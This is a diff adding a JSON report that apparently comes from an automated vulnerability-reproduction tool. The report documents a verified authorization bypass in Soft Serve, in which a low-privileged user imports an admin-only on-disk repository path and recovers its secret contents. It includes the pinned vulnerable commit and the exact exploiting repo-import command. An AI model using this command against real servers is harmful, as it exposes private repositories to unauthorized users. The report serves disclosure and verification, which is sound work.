@@ -1,0 +1,27 @@
+{
+  "status": "reproduced",
+  "vulnerability_type": "local_path_import_authorization_bypass",
+  "summary": "The Dockerized reproduction builds the vulnerable Soft Serve commit, starts a local server, and shows that a normal authenticated user can import an admin-only on-disk repository path and recover the secret content from the stolen clone.",
+  "reproduction_command": "./reproduction/run.sh",
+  "expected_security_impact": "Running the reproduction should allow low-privileged `user1` to import the server-local path of `admin-secret.git` into `stolen` and recover the proof string `TOP-SECRET-FROM-ADMIN` from the unauthorized clone.",
+  "actual_observed_result": "Running `./reproduction/run.sh` cloned upstream commit `85e19f1efe706115c1a5a16820b25b8ea61d6056`, built the reproduction image, started the vulnerable server, created the private `admin-secret` repo, pushed `secret.txt`, ran `repo import --lfs-endpoint https://example.com stolen ${DATA_PATH}/repos/admin-secret.git` as `user1`, then cloned `stolen` and printed `TOP-SECRET-FROM-ADMIN`, followed by `[evohunt] verification passed: imported repo exposed TOP-SECRET-FROM-ADMIN` and `[evohunt] SUCCESS: reproduction completed and verified`.",
+  "verification_method": "The container-side verifier builds the vulnerable binary, drives the SSH and Git workflow end to end, then compares `git -C stolen-copy show HEAD:secret.txt` against the expected proof string. The run only passes if the unauthorized import succeeds and the stolen repository contains the admin-only secret.",
+  "verification_passed": true,
+  "evidence_produced_by_run": [
+    "The reproduced workflow created `admin-secret`, pushed `secret.txt`, and completed `repo import --lfs-endpoint https://example.com stolen ${DATA_PATH}/repos/admin-secret.git` as `user1`.",
+    "The final `git -C stolen-copy show HEAD:secret.txt` output was exactly `TOP-SECRET-FROM-ADMIN`.",
+    "The run ended with `[evohunt] verification passed: imported repo exposed TOP-SECRET-FROM-ADMIN` and `[evohunt] SUCCESS: reproduction completed and verified`."
+  ],
+  "limitations_or_blockers": [],
+  "reproduction": {
+    "entrypoint": "./reproduction/run.sh",
+    "reproduction_directory": "reproduction",
+    "dockerfile_path": "reproduction/Dockerfile",
+    "source_acquisition": "run.sh clones the target repository on the host, checks out the pinned vulnerable commit, and mounts that checkout into the container at /target-repo.",
+    "pinned_commit_or_ref": "85e19f1efe706115c1a5a16820b25b8ea61d6056",
+    "target_repo_mount_path": "/target-repo",
+    "helper_files": [
+      "reproduction/verify.sh"
+    ]
+  }
+}
